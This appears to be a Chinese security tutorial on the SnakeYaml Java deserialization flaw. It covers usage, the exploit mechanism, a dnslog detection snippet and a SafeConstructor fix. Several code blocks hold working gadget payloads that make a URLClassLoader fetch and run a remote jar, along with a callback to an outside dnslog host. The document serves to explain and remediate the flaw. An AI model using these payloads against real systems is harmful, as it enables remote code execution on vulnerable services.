SnakeYaml是java解析yaml格式的组件库，SnakeYaml反序列化漏洞不存在版本限制，前提是能控制反序列化数据流。


SnakeYaml反序列化漏洞，不同的数据类型稍有不同：
当数据为键值对时，会调用构造方法和setter方法。
当数据是数组时候会调用构造方法，其中一条攻击链就是利用SPI机制来加载恶意类



## **SnakeYaml使用​**
导入依赖，如果是springboot项目，自带此依赖。
```
<dependency>​
  <groupId>org.yaml</groupId>​
  <artifactId>snakeyaml</artifactId>​
  <version>1.27</version>​
</dependency>
```
```
inputStream = new FileInputStream(filepath);​
yaml = new Yaml();​
// 使用文件输入流读取YAML文件​
yamlMap = yaml.load(inputStream);
```

## **反序列化漏洞**
当数据是数组时候会调用构造方法，其中一条攻击链就是利用SPI机制来加载恶意类：
使用 !!+全类名指定反序列化的类，反序列化过程中会实例化该类。snakeyaml 将全类名解析，并将类使用forname()进行加载，然后通过反射获取构造器，调用构造方法，控制适当的类的构造方法就能进行漏洞攻击。
如
```
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:7788/exp.jar"]]]]
```
探测
```
public class Snakeyaml {
    public static void main(String[] args) {
        String context = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://fnsdae.dnslog.cn\"]]]]\n";
        Yaml yaml = new Yaml();
        yaml.load(context);
    }
}
```
网上工具
<https://www.cnblogs.com/nice0e3/p/14514882.html>
Nacos反序列化漏洞
<https://mp.weixin.qq.com/s/SfAFMiraMKafcISo5IDEAg>

^
## **修复**
其实该漏洞涉及到了全版本，只要反序列化内容可控,那么就可以去进行反序列化攻击​
修复方案：加入new SafeConstructor()类进行过滤
```
public class main {​
    public static void main(String[] args) {​
        String context = "!!javax.script.ScriptEngineManager [\n" +​
                "  !!java.net.URLClassLoader [[\n" +​
                "    !!java.net.URL [\"http://127.0.0.1:8888/yaml-payload-master.jar\"]\n" +​
                "  ]]\n" +​
                "]";​
        Yaml yaml = new Yaml(new SafeConstructor());​
        yaml.load(context);​
    }​
}
```
